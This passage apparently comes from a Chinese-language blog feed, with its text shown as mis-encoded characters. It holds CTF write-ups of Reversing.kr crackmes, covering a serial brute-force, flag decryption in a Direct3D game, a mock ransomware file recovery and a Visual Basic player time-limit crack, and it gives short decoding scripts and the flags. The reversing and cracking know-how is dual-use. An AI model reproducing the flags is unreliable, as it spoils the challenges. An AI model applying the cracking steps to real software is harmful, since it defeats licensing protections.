        v41 = ((v22 &gt;&gt; 4) &amp; 1) + 1</span><br><span class="line">                    v37 = ((v22 &gt;&gt; 1) &amp; 1) + 1</span><br><span class="line">                    v23 = ((v22 &gt;&gt; 2) &amp; 1) + 1</span><br><span class="line">                    v39 = ((v22 &gt;&gt; 3) &amp; 1) + 1</span><br><span class="line">                    serial += str(v21 + v23)</span><br><span class="line">                    serial += str(v47 + v39)</span><br><span class="line">                    serial += str(v43 + v41)</span><br><span class="line">                    serial += str(v45 + v35)</span><br><span class="line">                    serial += str(v49 + v37)</span><br><span class="line">                    print(serial)</span><br><span class="line">                    if serial == &quot;76876-77776&quot; and name[3] == 112:</span><br><span class="line">                        for a in name:</span><br><span class="line">                            print(chr(a),)</span><br><span class="line">                        exit(0)</span><br><span class="line">                    else:</span><br><span class="line">                        name = []</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œå‡ åˆ†é’Ÿå°±èƒ½å¾—åˆ°ç­”æ¡ˆï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-5.png"
                      alt="image"
                ></p>
<p>flagï¼š <strong>bump</strong></p>
<h2 id="08-Direct3D-FPS"><a href="#08-Direct3D-FPS" class="headerlink" title="08 Direct3D FPS"></a>08 Direct3D FPS</h2><p>æœ¬é¢˜å¾ˆæœ‰æ„æ€ï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ª FPS æ¸¸æˆ(æˆ‘è¿è¡Œè¿™ä¸ªæ¸¸æˆå¸§æ•°éå¸¸ä½ï¼Œå¯èƒ½åªæœ‰ä¸ªä½æ•°ï¼Œåº”è¯¥æ˜¯æ˜¾å¡å…¼å®¹æ€§é—®é¢˜)ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯æ¸…å®Œæ‰€æœ‰æ€ªç‰©å°±èƒ½æ‹¿åˆ° flag ï¼Œå‹‰å¼ºæ‰“äº†ä¸€ä¼šï¼Œå®åœ¨æ˜¯æ— æ³•æ­£å¸¸æ¸¸æˆï¼Œè½¬è€Œè¿›è¡Œé™æ€åˆ†æï¼Œä½¿ç”¨ IDA æ‰“å¼€ç¨‹åºåï¼Œåç¼–è¯‘ WinMain å‡½æ•°ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šå’Œæ¸¸æˆç›¸å…³çš„æ“ä½œï¼Œä¾‹å¦‚åŠ è½½éŸ³é¢‘ï¼Œå›¾åƒç­‰ç­‰ï¼Œåœ¨ç¬¬ 135 è¡Œå‘ç°å¯¹ HP è¿›è¡Œäº†åˆ¤æ–­ï¼Œç´§æ¥ç€ä¸€ä¸ªå‡½æ•°å†…æœ‰ æ¸¸æˆé€šå…³ çš„æç¤ºï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-6.png"
                      alt="image"
                ></p>
<p>åŒå‡» byte_B67028 ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„åº”è¯¥å°±æ˜¯åŠ å¯†åçš„ flag ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡äº¤å‰å¼•ç”¨æ¥çœ‹çœ‹ flag æ˜¯å¦‚ä½•è§£å¯†çš„ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-7.png"
                      alt="image"
                ></p>
<p>äº¤å‰å¼•ç”¨åˆ°äº†å‡½æ•° sub_B63400 ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ¸…æ¥šçš„å‘ç°ï¼Œflag ä¸ byte_B69184[132 * result * 4] è¿›è¡Œçš„å¼‚æˆ–ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³åˆ°å»è·Ÿè¸ªä¸€ä¸‹è¿™é‡Œçš„å€¼æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯åœ¨é™æ€åˆ†ææ—¶ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œåªæœ‰å½“ç¨‹åºè¿è¡Œèµ·æ¥ä¹‹åæ‰ä¼šåŠ¨æ€çš„å‘è¿™é‡Œæ·»åŠ å†…å®¹ã€‚<br>æ¶‰åŠåˆ°ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹â€“ä½¿ç”¨ IDA å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œå…¶å®åœ¨ IDA ä¸­è°ƒè¯•å’Œä½¿ç”¨ OD ç±»ä¼¼ï¼Œåªä¸è¿‡æœ‰äº›æ“ä½œå¯èƒ½æ²¡æœ‰ OD ä½¿ç”¨èµ·æ¥é¡ºæ‰‹ï¼Œä½†æ˜¯ IDA èƒ½åšåˆ°ä¸€äº› OD å¾ˆéš¾å®ç°çš„æ“ä½œï¼Œé¦–å…ˆéœ€è¦å»å¾®è½¯ä¸‹è½½ Windbgï¼Œç„¶ååœ¨ä¸Šæ–¹çš„å·¥å…·æ ä¸­é€‰ä¸­ Windbg è°ƒè¯•å™¨ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-8.png"
                      alt="image"
                ></p>
<p>å°±å¯ä»¥æŒ‰ç»¿è‰²ä¸‰è§’æŒ‰é’®å¼€å§‹è°ƒè¯•äº†(å¯èƒ½åœ¨è®¾ç½®è¿‡ç¨‹ä¸­é‡åˆ°ä¸€äº›é—®é¢˜ï¼Œç™¾åº¦ä¸Šæœ‰å¾ˆè¯¦ç»†çš„æ•™ç¨‹)ã€‚åœ¨è°ƒè¯•ä¹‹å‰å…ˆä¸‹ä¸€ä¸ªæ–­ç‚¹(å¯ä»¥åœ¨åˆ¤æ–­ hp é™„è¿‘ä¸‹æ–­ï¼Œä½†æ˜¯ä¸è¦å¤ªé å‰ï¼Œè¦ä¿è¯ç¨‹åºå¯åŠ¨èµ·æ¥)ï¼Œå½“ç¨‹åºæ–­ä¸‹åï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æ‰‹åŠ¨å»å°†éœ€è¦çš„å€¼ä¸€ä¸ªä¸€ä¸ªçš„æ‰¾åˆ°ï¼Œä½†æ˜¯è¿™æ ·æ•ˆç‡å¤ªä½ï¼Œè€Œä¸”æ¯ä¸ªäººéƒ½ä¸ä¼šä¹æ„è¿™æ ·åšï¼Œå¼ºå¤§çš„ IDA ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä»¶ç¥å™¨ï¼šIDC(æˆ–æ›´æ–¹ä¾¿çš„ IDA-Python)ï¼Œå®ƒå°±åœ¨ IDA ç•Œé¢çš„æœ€ä¸‹æ–¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-9.png"
                      alt="image"
                ></p>
<p>å®ƒçš„ç”¨é€”éå¸¸å¹¿æ³›ï¼Œå¦‚æœèƒ½ç†Ÿç»ƒä½¿ç”¨ï¼Œå°†å¤§å¤§é™ä½é€†å‘çš„å·¥ä½œé‡ã€‚<br>è¿™é‡Œä½¿ç”¨ä¸€ä¸ª IDA-Python è„šæœ¬å°†ç›®æ ‡å€¼æ‰“å°å‡ºæ¥ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b = 0x3F9184</span><br><span class="line">for i in range(50):</span><br><span class="line">    print(Byte(b + i * 4 * 132),)</span><br></pre></td></tr></table></figure></div>
<p>åœ¨æ§åˆ¶å°çœ‹åˆ°ä»¥ä¸‹è¾“å‡º(æ•°æ®è¿‡å¤šæˆªä¸€éƒ¨åˆ†)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-10.png"
                      alt="image"
                ></p>
<p>ä¸éš¾å‘ç°ï¼Œç›®æ ‡å€¼éƒ½æ˜¯ 4 çš„å€æ•°ï¼Œé‚£ä¹ˆè§£å¯† flag çš„ç®—æ³•ä¹Ÿéå¸¸ç®€å•äº†ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">s = [67, 107, 102, 107,  98, 117, 108, 105,  76,  69, </span><br><span class="line">   92,  69,  95,  90,  70,  28,   7,  37,  37,  41, </span><br><span class="line">  112,  23,  52,  57,   1,  22,  73,  76,  32,  21, </span><br><span class="line">   11,  15, 247, 235, 250, 232, 176, 253, 235, 188, </span><br><span class="line">  244, 204, 218, 159, 245, 240, 232, 206, 240, 169]</span><br><span class="line">for i in range(50):</span><br><span class="line">    print(chr(s[i] ^ (i * 4)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œå³å¯å¾—åˆ°flag</p>
<p>flagï¼š <strong>Congratulation~ Game Clear! Password is Thr3EDPr0m</strong></p>
<h2 id="09-Ransomware"><a href="#09-Ransomware" class="headerlink" title="09 Ransomware"></a>09 Ransomware</h2><p>é¢˜ç›®åå­—å«åšå‹’ç´¢ï¼Œè§£å‹å‹ç¼©åŒ…åå¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶ï¼Œé˜…è¯»æç¤ºå‘ç°ï¼Œåä¸º file çš„æ–‡ä»¶å¯èƒ½è¢«åŠ å¯†äº†ï¼Œå¹¶ä¸”åŠ å¯†ç¨‹åºä¸º run.exeï¼Œå°è¯•æ‰“å¼€ run.exeï¼Œå‘ç°è¾“å‡ºäº†ä¸€å †ä¹±ç ï¼Œç„¶åæ˜¾ç¤ºå¦‚ä¸‹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-1.png"
                      alt="image"
                ></p>
<p>ç½‘ç«™æ˜¯éŸ©å›½äººæ­å»ºçš„ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ä¹±ç åº”è¯¥ä¹Ÿæ˜¯éŸ©æ–‡ï¼Œå°±ç®—ä¸æ˜¯ä¹±ç ä¹Ÿçœ‹ä¸æ‡‚ï¼Œæ‰€ä»¥å½±å“ä¸å¤§ã€‚<br>è¿™é‡Œçš„é€»è¾‘åº”è¯¥å°±æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥æŸä¸€ä¸ªå¯†ç ï¼Œç„¶åæ­¤ç¨‹åºå°±ä¼šå°†åŠ å¯†çš„æ–‡ä»¶è§£å¯†ï¼Œæ‰€ä»¥åŠ å¯†ç®—æ³•åº”è¯¥æ˜¯å¯é€†çš„ã€‚<br>åœ¨ä½¿ç”¨ PEID æŸ¥å£³æ—¶å‘ç°ï¼Œç¨‹åºåŠ äº† UPX çš„å£³ï¼Œä½¿ç”¨è„±å£³æœºæ— æ•ˆï¼Œé‚£ä¹ˆç›´æ¥æ‰‹è„±ï¼Œå¾—åˆ°æ­£å¸¸ç¨‹åºï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-2.png"
                      alt="image"
                ></p>
<p>çœ‹åˆ°è¿™ä¸ªå¤§å°å°±è§‰å¾—è¿™ä¸ªé¢˜ç›®ä¸ç®€å•ï¼Œè¦çŸ¥é“æºç¨‹åºæ˜¯ä»…æœ‰ 10kb å·¦å³çš„ï¼Œå°è¯•ä½¿ç”¨ IDA æ‰“å¼€è„±å£³åçš„æ–‡ä»¶ï¼Œå‘ç°éœ€è¦è§£æå¾ˆé•¿æ—¶é—´ï¼Œè€Œä¸”æ»¡çœ¼éƒ½æ˜¯ä»¥ä¸‹ä»£ç ï¼Œå®ƒä»¬æ²¡æœ‰ä»»ä½•å®è´¨æ€§çš„ä½œç”¨ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-3.png"
                      alt="image"
                ></p>
<p>åœ¨ä¸»å‡½æ•°çš„æœ€ä¸‹æ–¹ç»ˆäºæ‰¾åˆ°äº†æ­£å¸¸çš„ä»£ç ï¼Œä½†æ˜¯å‘ç°å…¶ä¸­å¤šæ¬¡è°ƒç”¨å‡½æ•° sub_401000 ï¼Œè¿™ä¸ªå‡½æ•°ä¸­å®Œå…¨æ˜¯ç”±é‚£äº›åƒåœ¾ä»£ç æ„æˆçš„ï¼Œå°è¯•ä½¿ç”¨ F5 IDAæ— æ³•åç¼–è¯‘ã€‚<br>å…¶å®è¿™äº›ä»£ç æˆä¸ºèŠ±ä»£ç ï¼Œæ˜¯ç¨‹åºå¼€å‘è€…ä¸ºäº†å¢åŠ é€†å‘åˆ†æçš„æˆæœ¬ï¼Œä¿æŠ¤è½¯ä»¶è€Œæ·»åŠ çš„åƒåœ¾ä»£ç ï¼Œå®ƒä»¬é€šå¸¸æ²¡æœ‰ä»»ä½•å®è´¨æ€§çš„ä½œç”¨ï¼Œä¸€èˆ¬ä¼šä¸¥é‡å½±å“é€†å‘åˆ†æè½¯ä»¶çš„å·¥ä½œã€‚æƒ³è¦ç»§ç»­åˆ†ææ­¤é¢˜ï¼Œå¯ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œä½†æ—¢ç„¶æœ‰ F5 çš„å¸Œæœ›ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶è¦æƒ³åŠæ³•å»ä½¿ç”¨ F5 äº†ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°æŒ‡ä»¤å»èŠ±ï¼Œé€šè¿‡è§‚å¯Ÿå‘ç°ï¼Œæœ¬ç¨‹åºä¸­çš„èŠ±ä»£ç æ˜¯ç”±ç›¸åŒçš„ 7 æ¡æŒ‡ä»¤æ„æˆçš„ï¼Œåœ¨åå…­è¿›åˆ¶çª—å£ä¸­èƒ½å¤Ÿæ‰¾åˆ°å®ƒä»¬ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-4.png"
                      alt="image"
                ></p>
<p>æœ‰ä¸€ä¸²åå…­è¿›åˆ¶ä¸€ç›´åœ¨é‡å¤ï¼š â€œ<strong>6061905058535B</strong>â€œ<br>è¿™å°±æ˜¯èŠ±ä»£ç ï¼Œæˆ‘ä»¬å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬å°†ç¨‹åºä¸­æ‰€æœ‰è¿™æ ·çš„å­—èŠ‚å…¨éƒ¨æ›¿æ¢ä¸º 0x90(å³ nop)ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data = open(&#x27;dumped_.exe&#x27;,&#x27;rb&#x27;).read() </span><br><span class="line">data = data.replace(&#x27;\x60\x61\x90\x50\x58\x53\x5b&#x27;,&#x27;\x90\x90\x90\x90\x90\x90\x90&#x27;) </span><br><span class="line">open(&#x27;fixed.exe&#x27;,&#x27;wb&#x27;).write(data)</span><br></pre></td></tr></table></figure></div>
<p>å†æ¬¡ä½¿ç”¨ IDA æ‰“å¼€æ¸…æ´—åçš„ç¨‹åºï¼Œä¼šå‘ç°èŠ±ä»£ç å·²ç»å…¨éƒ¨æ¶ˆå¤±äº†ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-5.png"
                      alt="image"
                ></p>
<p>è¿™æ—¶å†æ¬¡ä½¿ç”¨ F5 å°è¯•åç¼–è¯‘ï¼Œå‘ç° IDA è¿˜æ˜¯æŠ¥å‡ºé”™è¯¯ï¼Œæç¤ºæˆ‘ä»¬å‡½æ•°è¿‡å¤§ï¼Œè¿™é‡Œä¿®æ”¹ IDA çš„é…ç½®æ–‡ä»¶å³å¯ï¼Œæ‰“å¼€ä½ çš„ IDA å®‰è£…ç›®å½•ï¼Œæ‰¾åˆ° cfg æ–‡ä»¶å¤¹ä¸‹çš„ hexrays.cfg ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­çš„ç¬¬ 40 è¡Œ(IDA 7.0)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-6.png"
                      alt="image"
                ></p>
<p>å°†æ­¤é¡¹ä¿®æ”¹ä¸º 1024 ï¼Œé‡å¯ IDA å³å¯åç¼–è¯‘ä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-7.png"
                      alt="image"
                ></p>
<p>ç„¶åé€æ­¥å»åˆ†æç¨‹åºé€»è¾‘ï¼Œå‘ç°åŠ å¯†ç®—æ³•ä»ç¬¬ 44 è¡Œå¼€å§‹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-8.png"
                      alt="image"
                ></p>
<p>å°†ç§˜é’¥å’Œæ–‡ä»¶é€å­—èŠ‚å…ˆå¼‚æˆ–ç„¶åå–åï¼Œä¸¤ä¸ªæ“ä½œéƒ½æ˜¯å¯é€†çš„ï¼Œçœ‹åˆ°è¿™é‡Œç®—æ³•å’Œè¢«åŠ å¯†çš„æ–‡ä»¶éƒ½æœ‰äº†ï¼Œä½†æ˜¯ç§˜é’¥æœªçŸ¥ï¼Œç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆä¹Ÿä¸æ¸…æ¥š(å…¶å®å°±åœ¨æç¤ºé‡Œé¢)ï¼Œæƒ³äº†å¥½ä¹…ä¸çŸ¥é“ä¸‹ä¸€æ­¥è¯¥å¹²ä»€ä¹ˆï¼Œç™¾åº¦åˆ°äº†å‡ ç¯‡å¤§ä½¬çš„ WP ï¼ŒåŸæ¥ file æ–‡ä»¶æ˜¯ä¸€ä¸ª EXE ï¼Œæç¤ºä¸­ä¹Ÿå‘Šè¯‰äº†æˆ‘ä»¬è¿™ä¸€ç‚¹ã€‚ã€‚ã€‚</p>
<p>å‚è€ƒ WP ï¼Œç”±äº exe æ–‡ä»¶ä¸­æœ‰ä¸€æ®µæ¯”è¾ƒç‰¹æ®Šçš„è¯­å¥ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-9.png"
                      alt="image"
                ><br>æ‰€ä»¥å¯ä»¥æ ¹æ®è¿™å¥è¯æ¥æš´åŠ›ç ´è§£å‡ºç§˜é’¥(æˆ–è€…æ ¹æ®æ–‡ä»¶æœ«å°¾çš„ 0x00)ï¼Œè¿™é‡Œç›´æ¥è´´ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼š<br><a class="link"   href="https://blog.csdn.net/whklhhhh/article/details/78137138" >å‚è€ƒWP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C]</span><br><span class="line">for i in s:</span><br><span class="line">    print(chr((~i ^ 0)%256), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ç§˜é’¥çš„å¾ªç¯ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-10.png"
                      alt="image"
                ></p>
<p>å–å‡ºå…¶ä¸­æœ‰æ„ä¹‰çš„è¯­å¥å³ï¼š<strong>letsplaychess</strong>ï¼Œå°è¯•ä½¿ç”¨è¿™ä¸ªå¯†ç è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°äº†ä¸€ä¸ª EXE æ–‡ä»¶ï¼Œè¿è¡Œå³å¾— flagï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-11.png"
                      alt="image"
                ></p>
<p>flagï¼š <strong>Colle System</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 4 5</title>
    <url>/2018/09/04/reversingkr4-5/</url>
    <content><![CDATA[<p>Reversing.kr ä¸Šé¢çš„é¢˜ç›®ã€‚</p>
<span id="more"></span>

<h2 id="04-Music-Player"><a href="#04-Music-Player" class="headerlink" title="04 Music Player"></a>04 Music Player</h2><p>ç¬¬å››é¢˜å¢åŠ äº†ä¸€äº›éš¾åº¦ï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„éŸ³ä¹æ’­æ”¾å™¨ï¼Œä½†æ˜¯è½½å…¥çš„æ­Œæ›²æœ€å¤šåªèƒ½æ’­æ”¾1åˆ†é’Ÿï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œå¦‚æœèƒ½å¤Ÿä½¿å®ƒæ’­æ”¾è¶…è¿‡ä¸€åˆ†é’Ÿï¼Œå°±èƒ½çœ‹åˆ°flagã€‚  </p>
<p>ç¨‹åºæ²¡æœ‰åŠ å£³ï¼Œç›´æ¥ä¸¢è¿›IDAçœ‹ä¼šå‘ç°ä»£ç éå¸¸æ··ä¹±ï¼Œæœ‰å¾ˆå¤šæœªè§£æçš„ä»£ç ï¼Œå¦‚æœä½ ä½¿ç”¨PEIDç­‰å·¥å…·æ£€æŸ¥äº†ç¨‹åºçš„è¯å°±ä¼šå‘ç°ï¼Œç¨‹åºä½¿ç”¨VBç¼–å†™ï¼ŒVBæœ‰ä¸¤ç§ç¼–è¯‘æ¨¡å¼ï¼Œç¬¬ä¸€ä¸ªå«åš P-Code(ä¼ªä»£ç ç¼–è¯‘)ï¼Œå¦ä¸€ç§åˆ™æ˜¯æ­£å¸¸çš„æœ¬æœºä»£ç ç¼–è¯‘ï¼ŒP-Code æ¨¡å¼ä¼šå°†ä»£ç ç¼–è¯‘ä¸ºVBç‰¹æœ‰çš„ä¼ªä»£ç å½¢å¼ï¼Œç”± VB çš„è™šæ‹Ÿæœºè¿è¡Œï¼Œä¸å·§çš„æ˜¯ï¼Œå¾®è½¯å¹¶æ²¡æœ‰å…¬å¼€è¿™ä¸ªè™šæ‹Ÿæœºçš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰é€†å‘æ–¹æ³•çš„ï¼Œåªä¸è¿‡éœ€è¦æ³¨æ„ä¸€äº›ç»†èŠ‚ï¼ŒODå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨ä¿®æ”¹æœºå™¨ç çš„æ—¶å€™å°±éœ€è¦ç‰¹åˆ«æ³¨æ„äº†ã€‚é€šè¿‡ä½¿ç”¨VBä¸“ç”¨çš„é€†å‘å·¥å…·ä¹Ÿèƒ½å¾—åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ä½¿ç”¨ VBExplore æ‰“å¼€è¿™ä¸ªç¨‹åºï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-1.png"
                      alt="image"
                ></p>
<p>å¤§è‡´æµè§ˆå„ä¸ªæ§ä»¶ï¼Œå†è¿è¡Œç¨‹åºï¼Œå¯ä»¥ä¸€ä¸€å¯¹åº”ï¼Œå…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªè®¡æ—¶å™¨ï¼Œä¸è¿‡æ²¡æœ‰ä»£ç å¯¹ç…§ï¼Œå¯èƒ½æ— æ³•å¾—çŸ¥å®ƒä»¬çš„ç”¨é€”ã€‚<br>ç›´æ¥ç¥­å‡º ODï¼Œå¼€å§‹è°ƒè¯•ç¨‹åºã€‚  </p>
<p><strong>æ³¨æ„ï¼šè¿˜æœ‰ä¸€æ¬¾å®ç”¨è½¯ä»¶ VB Decompilerï¼Œå®ƒå¯ä»¥åæ±‡ç¼–ä»¥åŠåç¼–è¯‘VBç¨‹åºï¼Œå¯¹äºè¿™ç§P-CODEè¿˜æ˜¯èƒ½å¤Ÿå¤„ç†å‡ºä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œè¿™é‡Œä¸ä»¥å®ƒä¸ºå‚è€ƒã€‚</strong></p>
<p>é¦–å…ˆè¦äº†è§£é€†å‘ VB çš„ä¸€äº›åŸºæœ¬æŠ€å·§ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªGUIç¨‹åºï¼Œæ‰€ä»¥æƒ³è¦å®šä½å…³é”®ä»£ç ï¼Œä¸€å®šè¦äº†è§£ä¸€äº›VBçš„APIï¼Œæ¯”å¦‚è´Ÿè´£å¼¹å‡ºçª—å£çš„ <strong>rtcMsgBox</strong> æˆ–è€… <strong>__vbaNew2</strong>ï¼Œä»¥åŠæ“ä½œå­—ç¬¦ä¸²çš„ä¸€äº›å‡½æ•°ï¼Œè¿™äº›éƒ½æ˜¯ç ´è§£ä¸­è¾ƒä¸ºå¸¸ç”¨çš„ï¼Œå¼ºå¤§çš„ OD å·²ç»é›†æˆäº†ä¸€äº›æ’ä»¶ï¼Œå¯ä»¥è®©æˆ‘ä»¬ç›´æ¥åœ¨è¿™äº›ç³»ç»Ÿå‡½æ•°ä¸­ä¸‹æ–­(æ‰“å¼€ODåä¸Šé¢çš„ç°è‰²å·¥å…·æ¡ä¸­ï¼Œç‚¹å‡»VB)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-2.png"
                      alt="image"
                ></p>
<p>è¿™é‡Œèƒ½çœ‹åˆ°å¾ˆå¤šå®ç”¨çš„æ–­ç‚¹å·¥å…·ï¼Œæœ¬é¢˜ä¸»è¦ä½¿ç”¨ç¬¬ä¸€é¡¹ï¼ˆå› ä¸ºåœ¨æ’­æ”¾æ»¡ä¸€åˆ†é’Ÿæ—¶ä¼šå¼¹å‡ºä¸€ä¸ªçª—å£ï¼‰ï¼Œç‚¹å‡»åå†æ‰“å¼€æ–­ç‚¹çª—å£ï¼Œèƒ½çœ‹åˆ°æ–°å¢åŠ äº†ä¸€ä¸ªæ–­ç‚¹:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-3.png"
                      alt="image"
                ></p>
<p>è¿™ä¸ªæ–­ç‚¹å°±åœ¨ rtcMsgBox äº†ï¼Œä»¥åç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå†æ¬¡è°ƒç”¨åˆ°äº†è¿™ä¸ªå‡½æ•°ï¼Œè°ƒè¯•å™¨å°±ä¼šæ–­åœ¨è¿™é‡Œï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå›æº¯ã€‚<br>ç„¶åF9è¿è¡Œç¨‹åºï¼Œæ‰“å¼€ä¸€ä¸ªMP3æ–‡ä»¶(å¤§äº1åˆ†é’Ÿ)ï¼Œç‚¹å‡»æ’­æ”¾æŒ‰é’®å¼€å§‹æ’­æ”¾ï¼Œç­‰æ’­æ”¾åˆ°1åˆ†é’Ÿ(å¯ä»¥ç›´æ¥æ‹–åŠ¨è¿›åº¦æ¡)ï¼Œå¦‚æœä¸å‡ºæ„å¤– OD ä¼šè§¦å‘ä¹‹å‰ä¸‹çš„æ–­ç‚¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-4.png"
                      alt="image"
                ></p>
<p>è¿™æ—¶è§‚å¯Ÿæ ˆä¸­çš„æ•°æ®ï¼Œæ ¹æ®å‡½æ•°è°ƒç”¨çº¦å®šï¼Œè¿™æ—¶æ ˆé¡¶çš„å†…å®¹å°±æ˜¯è°ƒç”¨è€…çš„åœ°å€ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-5.png"
                      alt="image"
                ></p>
<p>æœ‰äº›æƒ…å†µä¸‹æ ˆé¡¶å¯èƒ½å¹¶ä¸æ˜¯è°ƒç”¨è€…çš„åœ°å€ï¼Œè¿™æ—¶å¯ä»¥ç‚¹å‡»ä¸Šæ–¹å·¥å…·æ ä¸­çš„ â€œkâ€ æŒ‰é’®ï¼Œæ˜¾ç¤ºè°ƒç”¨å †æ ˆï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-6.png"
                      alt="image"
